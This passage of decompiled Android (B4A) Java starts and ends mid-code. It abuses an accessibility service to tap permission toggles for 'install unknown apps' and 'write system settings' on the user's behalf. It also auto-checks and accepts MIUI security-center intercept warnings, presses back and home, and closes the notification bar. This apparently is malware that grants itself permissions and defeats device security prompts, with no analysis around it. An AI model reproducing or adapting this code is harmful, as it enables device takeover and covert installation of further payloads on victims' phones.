                accessibilityEventsListener3.PerformGlobalAction(1);
                backgroundservice backgroundserviceVar6 = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener4 = backgroundservice._acs;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                backgroundservice backgroundserviceVar7 = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener5 = backgroundservice._acs;
                backgroundservice backgroundserviceVar8 = mostCurrent._backgroundservice;
                AccessibilityConstants accessibilityConstants3 = backgroundservice._accservconstants;
                accessibilityEventsListener5.PerformGlobalAction(2);
                backgroundservice backgroundserviceVar9 = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener6 = backgroundservice._acs;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                _intpermissionno = 6;
                _inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(new IntentWrapper(), (Intent) Common.Null);
                return "";
            }
        }
        return "";
    }

    public static void _start_perm_unknown(BA ba, List list, String str, String str2) throws Exception {
        ResumableSub_start_perm_unknown resumableSub_start_perm_unknown = new ResumableSub_start_perm_unknown(null, ba, list, str, str2);
        if (ba.processBA != null) {
            ba = ba.processBA;
        }
        resumableSub_start_perm_unknown.resume(ba, null);
    }

    public static class ResumableSub_start_perm_unknown extends BA.ResumableSub {
        BA _ba;
        List _rootinactivewindow;
        String _strevt;
        String _strpkg;
        BA.IterableList group12;
        BA.IterableList group21;
        BA.IterableList group3;
        BA.IterableList group40;
        BA.IterableList group68;
        int groupLen12;
        int groupLen21;
        int groupLen3;
        int groupLen40;
        int groupLen68;
        int index12;
        int index21;
        int index3;
        int index40;
        int index68;
        clsclassperms_code parent;
        Map _mp = null;
        int _ismultiswitches = 0;
        boolean _isstartfromhere = false;

        public ResumableSub_start_perm_unknown(clsclassperms_code clsclassperms_codeVar, BA ba, List list, String str, String str2) {
            this.parent = clsclassperms_codeVar;
            this._ba = ba;
            this._rootinactivewindow = list;
            this._strpkg = str;
            this._strevt = str2;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA ba, Object[] objArr) throws Exception {
            while (true) {
                try {
                    switch (this.state) {
                        case -1:
                            return;
                        case 0:
                            this.state = 1;
                            break;
                        case 1:
                            this.state = 98;
                            this.catchState = 97;
                            this.state = 3;
                            break;
                        case 3:
                            this.state = 4;
                            this.catchState = 97;
                            break;
                        case 4:
                            this.state = 95;
                            if (clsclassperms_code._is_list_perm(this._ba, this._rootinactivewindow)) {
                                this.state = 6;
                                break;
                            } else {
                                this.state = 16;
                                break;
                            }
                        case 6:
                            this.state = 7;
                            break;
                        case 7:
                            this.state = 14;
                            this._mp = new Map();
                            List list = this._rootinactivewindow;
                            this.group3 = list;
                            this.index3 = 0;
                            this.groupLen3 = list.getSize();
                            this.state = 99;
                            break;
                        case 9:
                            this.state = 10;
                            break;
                        case 10:
                            this.state = 13;
                            String lowerCase = BA.ObjectToString(this._mp.Get("ViewText")).toLowerCase();
                            B4AApplication b4AApplication = Common.Application;
                            if (!lowerCase.contains(B4AApplication.getLabelName().toLowerCase())) {
                                break;
                            } else {
                                this.state = 12;
                                break;
                            }
                        case 12:
                            this.state = 13;
                            backgroundservice backgroundserviceVar = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                            int ObjectToNumber = (int) BA.ObjectToNumber(this._mp.Get("Left"));
                            int ObjectToNumber2 = (int) BA.ObjectToNumber(this._mp.Get("Top"));
                            int ObjectToNumber3 = (int) BA.ObjectToNumber(this._mp.Get("width"));
                            int ObjectToNumber4 = (int) BA.ObjectToNumber(this._mp.Get("Height"));
                            B4AApplication b4AApplication2 = Common.Application;
                            accessibilityEventsListener.PerformClick_ByTemp(ObjectToNumber, ObjectToNumber2, ObjectToNumber3, ObjectToNumber4, B4AApplication.getLabelName(), "android:id/title");
                            backgroundservice backgroundserviceVar2 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            return;
                        case 13:
                            this.state = 100;
                            break;
                        case 14:
                            this.state = 95;
                            break;
                        case 16:
                            this.state = 17;
                            this._ismultiswitches = 0;
                            break;
                        case 17:
                            this.state = 28;
                            this._mp = new Map();
                            List list2 = this._rootinactivewindow;
                            this.group12 = list2;
                            this.index12 = 0;
                            this.groupLen12 = list2.getSize();
                            this.state = 101;
                            break;
                        case 19:
                            this.state = 20;
                            break;
                        case 20:
                            this.state = 27;
                            if (!clsclassperms_code._canrequestpackageinstalls(this._ba)) {
                                this.state = 22;
                                break;
                            } else {
                                break;
                            }
                        case 22:
                            this.state = 23;
                            break;
                        case 23:
                            this.state = 26;
                            if (!BA.ObjectToString(this._mp.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                                break;
                            } else {
                                this.state = 25;
                                break;
                            }
                        case 25:
                            this.state = 26;
                            this._ismultiswitches++;
                            break;
                        case 26:
                            this.state = 27;
                            break;
                        case 27:
                            this.state = 102;
                            break;
                        case 28:
                            this.state = 94;
                            if (this._ismultiswitches == 1) {
                                this.state = 30;
                                break;
                            } else {
                                this.state = 48;
                                break;
                            }
                        case 30:
                            this.state = 31;
                            break;
                        case KeyCodes.KEYCODE_C /* 31 */:
                            this.state = 46;
                            if (!BA.ObjectToString(this._rootinactivewindow).contains("switch_widget")) {
                                break;
                            } else {
                                this.state = 33;
                                break;
                            }
                        case 33:
                            this.state = 34;
                            break;
                        case 34:
                            this.state = 45;
                            this._mp = new Map();
                            List list3 = this._rootinactivewindow;
                            this.group21 = list3;
                            this.index21 = 0;
                            this.groupLen21 = list3.getSize();
                            this.state = 103;
                            break;
                        case 36:
                            this.state = 37;
                            break;
                        case 37:
                            this.state = 44;
                            if (!clsclassperms_code._canrequestpackageinstalls(this._ba)) {
                                this.state = 39;
                                break;
                            } else {
                                break;
                            }
                        case 39:
                            this.state = 40;
                            break;
                        case 40:
                            this.state = 43;
                            if (!BA.ObjectToString(this._mp.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                                break;
                            } else {
                                this.state = 42;
                                break;
                            }
                        case 42:
                            this.state = 43;
                            backgroundservice backgroundserviceVar3 = clsclassperms_code.mostCurrent._backgroundservice;
                            backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(this._mp.Get("Left")), (int) BA.ObjectToNumber(this._mp.Get("Top")), (int) BA.ObjectToNumber(this._mp.Get("width")), (int) BA.ObjectToNumber(this._mp.Get("Height")), "", "android:id/switch_widget");
                            backgroundservice backgroundserviceVar4 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar5 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener4 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar6 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                            accessibilityEventsListener4.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar7 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener5 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar8 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener6 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar9 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
                            accessibilityEventsListener6.PerformGlobalAction(2);
                            backgroundservice backgroundserviceVar10 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener7 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            return;
                        case 43:
                            this.state = 44;
                            break;
                        case 44:
                            this.state = 102;
                            break;
                        case 45:
                            this.state = 46;
                            return;
                        case 46:
                            this.state = 94;
                            break;
                        case 48:
                            this.state = 49;
                            break;
                        case KeyCodes.KEYCODE_U /* 49 */:
                            this.state = 78;
                            if (this._ismultiswitches <= 1) {
                                break;
                            } else {
                                this.state = 51;
                                break;
                            }
                        case KeyCodes.KEYCODE_W /* 51 */:
                            this.state = 52;
                            break;
                        case KeyCodes.KEYCODE_X /* 52 */:
                            this.state = 77;
                            if (!BA.ObjectToString(this._rootinactivewindow).toLowerCase().contains("miui") && !clsclassperms_code._canrequestpackageinstalls(this._ba) && clsclassperms_code._candrawoverlays(this._ba) && clsclassperms_code._check_if_notis(this._ba)) {
                                this.state = 54;
                                break;
                            }
                            break;
                        case KeyCodes.KEYCODE_Z /* 54 */:
                            this.state = 55;
                            this._isstartfromhere = false;
                            break;
                        case KeyCodes.KEYCODE_COMMA /* 55 */:
                            this.state = 73;
                            this._mp = new Map();
                            List list4 = this._rootinactivewindow;
                            this.group40 = list4;
                            this.index40 = 0;
                            this.groupLen40 = list4.getSize();
                            this.state = 105;
                            break;
                        case KeyCodes.KEYCODE_ALT_LEFT /* 57 */:
                            this.state = 58;
                            break;
                        case KeyCodes.KEYCODE_ALT_RIGHT /* 58 */:
                            this.state = 61;
                            String lowerCase2 = BA.ObjectToString(this._mp.Get("ViewText")).toLowerCase();
                            B4AApplication b4AApplication3 = Common.Application;
                            if (!lowerCase2.contains(B4AApplication.getLabelName().toLowerCase())) {
                                break;
                            } else {
                                this.state = 60;
                                break;
                            }
                        case 60:
                            this.state = 61;
                            this._isstartfromhere = true;
                            break;
                        case KeyCodes.KEYCODE_TAB /* 61 */:
                            this.state = 72;
                            if (!this._isstartfromhere) {
                                break;
                            } else {
                                this.state = 63;
                                break;
                            }
                        case 63:
                            this.state = 64;
                            break;
                        case 64:
                            this.state = 71;
                            if (!clsclassperms_code._canrequestpackageinstalls(this._ba)) {
                                this.state = 66;
                                break;
                            } else {
                                break;
                            }
                        case KeyCodes.KEYCODE_ENTER /* 66 */:
                            this.state = 67;
                            break;
                        case KeyCodes.KEYCODE_DEL /* 67 */:
                            this.state = 70;
                            if (!BA.ObjectToString(this._mp.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                                break;
                            } else {
                                this.state = 69;
                                break;
                            }
                        case KeyCodes.KEYCODE_MINUS /* 69 */:
                            this.state = 70;
                            backgroundservice backgroundserviceVar11 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener8 = backgroundservice._acs;
                            B4AApplication b4AApplication4 = Common.Application;
                            String labelName = B4AApplication.getLabelName();
                            backgroundservice backgroundserviceVar12 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants3 = backgroundservice._accservconstants;
                            Map map = new Map();
                            java.util.Map map2 = (java.util.Map) Common.Null;
                            java.util.Map map3 = map2;
                            accessibilityEventsListener8.PerformNodeActionOnViewWithArgs(false, labelName, 16, (Map) AbsObjectWrapper.ConvertToWrapper(map, map2));
                            backgroundservice backgroundserviceVar13 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener9 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar14 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener10 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar15 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants4 = backgroundservice._accservconstants;
                            accessibilityEventsListener10.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar16 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener11 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar17 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener12 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar18 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants5 = backgroundservice._accservconstants;
                            accessibilityEventsListener12.PerformGlobalAction(2);
                            backgroundservice backgroundserviceVar19 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener13 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            clsclassperms_code._intpermissionno = 4;
                            IntentWrapper intentWrapper = new IntentWrapper();
                            Intent intent = (Intent) Common.Null;
                            Intent intent2 = intent;
                            clsclassperms_code._inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper, intent);
                            this.state = 73;
                            break;
                        case KeyCodes.KEYCODE_EQUALS /* 70 */:
                            this.state = 71;
                            break;
                        case KeyCodes.KEYCODE_LEFT_BRACKET /* 71 */:
                            this.state = 72;
                            break;
                        case KeyCodes.KEYCODE_RIGHT_BRACKET /* 72 */:
                            this.state = 106;
                            break;
                        case KeyCodes.KEYCODE_BACKSLASH /* 73 */:
                            this.state = 76;
                            if (!this._isstartfromhere && clsclassperms_code._intpermissionno == 2) {
                                this.state = 75;
                                break;
                            }
                            break;
                        case KeyCodes.KEYCODE_APOSTROPHE /* 75 */:
                            this.state = 76;
                            backgroundservice backgroundserviceVar20 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener14 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar21 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants6 = backgroundservice._accservconstants;
                            accessibilityEventsListener14.PerformGlobalAction(4);
                            backgroundservice backgroundserviceVar22 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener15 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar23 = clsclassperms_code.mostCurrent._backgroundservice;
                            backgroundservice._acs.close_notificationbar();
                            break;
                        case 76:
                            this.state = 77;
                            break;
                        case KeyCodes.KEYCODE_AT /* 77 */:
                            this.state = 78;
                            break;
                        case KeyCodes.KEYCODE_NUM /* 78 */:
                            this.state = 93;
                            if (this._strpkg.toLowerCase().contains("com.miui.securitycenter") && !clsclassperms_code._canrequestpackageinstalls(this._ba) && clsclassperms_code._canwritetosystemsettings(this._ba) && clsclassperms_code._candrawoverlays(this._ba) && clsclassperms_code._check_if_notis(this._ba) && clsclassperms_code._intpermissionno == 3 && BA.ObjectToString(this._rootinactivewindow).toLowerCase().contains("com.miui.securitycenter:id/intercept_warn_content_end")) {
                                this.state = 80;
                                break;
                            }
                            break;
                        case 80:
                            this.state = 81;
                            break;
                        case KeyCodes.KEYCODE_PLUS /* 81 */:
                            this.state = 92;
                            this._mp = new Map();
                            List list5 = this._rootinactivewindow;
                            this.group68 = list5;
                            this.index68 = 0;
                            this.groupLen68 = list5.getSize();
                            this.state = 107;
                            break;
                        case KeyCodes.KEYCODE_NOTIFICATION /* 83 */:
                            this.state = 84;
                            break;
                        case KeyCodes.KEYCODE_SEARCH /* 84 */:
                            this.state = 91;
                            if (!BA.ObjectToString(this._mp.Get("viewid")).toLowerCase().contains("com.miui.securitycenter:id/check_box")) {
                                break;
                            } else {
                                this.state = 86;
                                break;
                            }
                        case KeyCodes.KEYCODE_MEDIA_STOP /* 86 */:
                            this.state = 87;
                            break;
                        case KeyCodes.KEYCODE_MEDIA_NEXT /* 87 */:
                            this.state = 90;
                            if (1.0d != BA.ObjectToNumber(this._mp.Get("checked"))) {
                                break;
                            } else {
                                this.state = 89;
                                break;
                            }
                        case KeyCodes.KEYCODE_MEDIA_REWIND /* 89 */:
                            this.state = 90;
                            clsclassperms_code._timerchecker.setEnabled(false);
                            Common.Sleep(this._ba, this, 10000);
                            this.state = 109;
                            return;
                        case KeyCodes.KEYCODE_MEDIA_FAST_FORWARD /* 90 */:
                            this.state = 91;
                            backgroundservice backgroundserviceVar24 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener16 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar25 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants7 = backgroundservice._accservconstants;
                            Map map4 = new Map();
                            java.util.Map map5 = (java.util.Map) Common.Null;
                            java.util.Map map6 = map5;
                            accessibilityEventsListener16.PerformNodeActionOnViewWithArgs(true, "com.miui.securitycenter:id/check_box", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map4, map5));
                            backgroundservice backgroundserviceVar26 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener17 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            clsclassperms_code._timerchecker.setEnabled(false);
                            Common.Sleep(this._ba, this, 10000);
                            this.state = 110;
                            return;
                        case KeyCodes.KEYCODE_MUTE /* 91 */:
                            this.state = 108;
                            break;
                        case 92:
                            this.state = 93;
                            break;
                        case 93:
                            this.state = 94;
                            break;
                        case 94:
                            this.state = 95;
                            break;
                        case 95:
                            this.state = 98;
                            break;
                        case 97:
                            this.state = 98;
                            this.catchState = 0;
                            break;
                        case 98:
                            this.state = -1;
                            this.catchState = 0;
                            break;
                        case 99:
                            this.state = 14;
                            if (this.index3 >= this.groupLen3) {
                                break;
                            } else {
                                this.state = 9;
                                Map map7 = new Map();
                                java.util.Map map8 = (java.util.Map) this.group3.Get(this.index3);
                                java.util.Map map9 = map8;
                                this._mp = (Map) AbsObjectWrapper.ConvertToWrapper(map7, map8);
                                break;
                            }
                        case 100:
                            this.state = 99;
                            this.index3++;
                            break;
                        case 101:
                            this.state = 28;
                            if (this.index12 >= this.groupLen12) {
                                break;
                            } else {
                                this.state = 19;
                                Map map10 = new Map();
                                java.util.Map map11 = (java.util.Map) this.group12.Get(this.index12);
                                java.util.Map map12 = map11;
                                this._mp = (Map) AbsObjectWrapper.ConvertToWrapper(map10, map11);
                                break;
                            }
                        case 102 /* 102 */:
                            this.state = 101;
                            this.index12++;
                            break;
                        case 103:
                            this.state = 45;
                            if (this.index21 >= this.groupLen21) {
                                break;
                            } else {
                                this.state = 36;
                                Map map13 = new Map();
                                java.util.Map map14 = (java.util.Map) this.group21.Get(this.index21);
                                java.util.Map map15 = map14;
                                this._mp = (Map) AbsObjectWrapper.ConvertToWrapper(map13, map14);
                                break;
                            }
                        case 104 /* 104 */:
                            this.state = 103;
                            this.index21++;
                            break;
                        case 105:
                            this.state = 73;
                            if (this.index40 >= this.groupLen40) {
                                break;
                            } else {
                                this.state = 57;
                                Map map16 = new Map();
                                java.util.Map map17 = (java.util.Map) this.group40.Get(this.index40);
                                java.util.Map map18 = map17;
                                this._mp = (Map) AbsObjectWrapper.ConvertToWrapper(map16, map17);
                                break;
                            }
                        case 106:
                            this.state = 105;
                            this.index40++;
                            break;
                        case 107:
                            this.state = 92;
                            if (this.index68 >= this.groupLen68) {
                                break;
                            } else {
                                this.state = 83;
                                Map map19 = new Map();
                                java.util.Map map20 = (java.util.Map) this.group68.Get(this.index68);
                                java.util.Map map21 = map20;
                                this._mp = (Map) AbsObjectWrapper.ConvertToWrapper(map19, map20);
                                break;
                            }
                        case 108:
                            this.state = 107;
                            this.index68++;
                            break;
                        case 109:
                            this.state = 90;
                            backgroundservice backgroundserviceVar27 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener18 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar28 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants8 = backgroundservice._accservconstants;
                            Map map22 = new Map();
                            java.util.Map map23 = (java.util.Map) Common.Null;
                            java.util.Map map24 = map23;
                            accessibilityEventsListener18.PerformNodeActionOnViewWithArgs(true, "com.miui.securitycenter:id/intercept_warn_allow", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map22, map23));
                            backgroundservice backgroundserviceVar29 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener19 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar30 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener20 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar31 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants9 = backgroundservice._accservconstants;
                            accessibilityEventsListener20.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar32 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener21 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar33 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener22 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar34 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants10 = backgroundservice._accservconstants;
                            accessibilityEventsListener22.PerformGlobalAction(2);
                            backgroundservice backgroundserviceVar35 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener23 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            clsclassperms_code._intpermissionno = 4;
                            IntentWrapper intentWrapper2 = new IntentWrapper();
                            Intent intent3 = (Intent) Common.Null;
                            Intent intent4 = intent3;
                            clsclassperms_code._inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper2, intent3);
                            clsclassperms_code._timerchecker.setEnabled(true);
                            return;
                        case 110:
                            this.state = 91;
                            clsclassperms_code._timerchecker.setEnabled(true);
                            backgroundservice backgroundserviceVar36 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener24 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar37 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants11 = backgroundservice._accservconstants;
                            Map map25 = new Map();
                            java.util.Map map26 = (java.util.Map) Common.Null;
                            java.util.Map map27 = map26;
                            accessibilityEventsListener24.PerformNodeActionOnViewWithArgs(true, "com.miui.securitycenter:id/intercept_warn_allow", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map25, map26));
                            backgroundservice backgroundserviceVar38 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener25 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar39 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener26 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar40 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants12 = backgroundservice._accservconstants;
                            accessibilityEventsListener26.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar41 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener27 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar42 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener28 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar43 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants13 = backgroundservice._accservconstants;
                            accessibilityEventsListener28.PerformGlobalAction(2);
                            backgroundservice backgroundserviceVar44 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener29 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            clsclassperms_code._intpermissionno = 4;
                            IntentWrapper intentWrapper3 = new IntentWrapper();
                            Intent intent5 = (Intent) Common.Null;
                            Intent intent6 = intent5;
                            clsclassperms_code._inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper3, intent5);
                            return;
                    }
                } catch (Exception e) {
                    if (this.catchState == 0) {
                        throw e;
                    }
                    this.state = this.catchState;
                    (this._ba.processBA == null ? this._ba : this._ba.processBA).setLastException(e);
                }
            }
        }
    }

    public static String _start_perm_write(BA ba, List list, String str, String str2) throws Exception {
        BA ba2 = ba;
        try {
            if (_is_list_perm(ba, list)) {
                new Map();
                int size = list.getSize();
                for (int i = 0; i < size; i++) {
                    Map map = new Map();
                    java.util.Map map2 = (java.util.Map) list.Get(i);
                    java.util.Map map3 = map2;
                    Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
                    String lowerCase = BA.ObjectToString(map4.Get("ViewText")).toLowerCase();
                    B4AApplication b4AApplication = Common.Application;
                    if (lowerCase.contains(B4AApplication.getLabelName().toLowerCase())) {
                        backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                        int ObjectToNumber = (int) BA.ObjectToNumber(map4.Get("Left"));
                        int ObjectToNumber2 = (int) BA.ObjectToNumber(map4.Get("Top"));
                        int ObjectToNumber3 = (int) BA.ObjectToNumber(map4.Get("width"));
                        int ObjectToNumber4 = (int) BA.ObjectToNumber(map4.Get("Height"));
                        B4AApplication b4AApplication2 = Common.Application;
                        accessibilityEventsListener.PerformClick_ByTemp(ObjectToNumber, ObjectToNumber2, ObjectToNumber3, ObjectToNumber4, B4AApplication.getLabelName(), "android:id/title");
                        backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                        return "";
                    }
                }
            } else {
                new Map();
                int size2 = list.getSize();
                int i2 = 0;
                for (int i3 = 0; i3 < size2; i3++) {
                    Map map5 = new Map();
                    java.util.Map map6 = (java.util.Map) list.Get(i3);
                    java.util.Map map7 = map6;
                    Map map8 = (Map) AbsObjectWrapper.ConvertToWrapper(map5, map6);
                    if (!_canwritetosystemsettings(ba) && BA.ObjectToString(map8.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                        i2++;
                    }
                }
                if (i2 == 1) {
                    if (BA.ObjectToString(list).contains("switch_widget")) {
                        new Map();
                        int size3 = list.getSize();
                        for (int i4 = 0; i4 < size3; i4++) {
                            Map map9 = new Map();
                            java.util.Map map10 = (java.util.Map) list.Get(i4);
                            java.util.Map map11 = map10;
                            Map map12 = (Map) AbsObjectWrapper.ConvertToWrapper(map9, map10);
                            if (!_canwritetosystemsettings(ba) && BA.ObjectToString(map12.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                                backgroundservice backgroundserviceVar3 = mostCurrent._backgroundservice;
                                backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map12.Get("Left")), (int) BA.ObjectToNumber(map12.Get("Top")), (int) BA.ObjectToNumber(map12.Get("width")), (int) BA.ObjectToNumber(map12.Get("Height")), "", "android:id/switch_widget");
                                backgroundservice backgroundserviceVar4 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar5 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener4 = backgroundservice._acs;
                                backgroundservice backgroundserviceVar6 = mostCurrent._backgroundservice;
                                AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                                accessibilityEventsListener4.PerformGlobalAction(1);
                                backgroundservice backgroundserviceVar7 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener5 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar8 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener6 = backgroundservice._acs;
